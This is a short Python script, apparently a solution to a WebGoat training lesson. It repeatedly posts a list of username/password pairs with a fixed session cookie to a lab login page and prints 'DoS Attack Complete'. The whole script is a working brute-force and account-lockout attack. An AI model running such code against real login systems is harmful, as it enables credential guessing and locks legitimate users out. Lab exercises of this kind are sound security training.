import requests

def logins():
    max_attemps = 3
    accounts = {"jsnow":"passwd1", "jdoe":"passwd2", "jplane":"passwd3", "jeff":"jeff", "dave":"dave"}
    headers = {'User-Agent': "Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0"}
    cookies = {"JSESSIONID":"E67A4E1592BE388107FF660CB11122B5", "acopendivids":"swingset,jotto,phpbb2,redmine", "acgroupswithpersist":"nada"}
    url = "http://192.168.0.161/WebGoat/attack?Screen=63&menu=1200"

    login_attemps = 0
    while login_attemps < max_attemps:
        for key, value in accounts.items():
            params = {"User Name":key, "Password":value, "SUBMIT":"Login"}
            r = requests.post(url, headers=headers, cookies=cookies, params=params)
            if r.status_code == 200:
                login_attemps +=1
                print(f"login succesful with user:{key} and password:{value}")
            else:
                print("login failed")
logins()
print("[*] DoS Attack Complete!")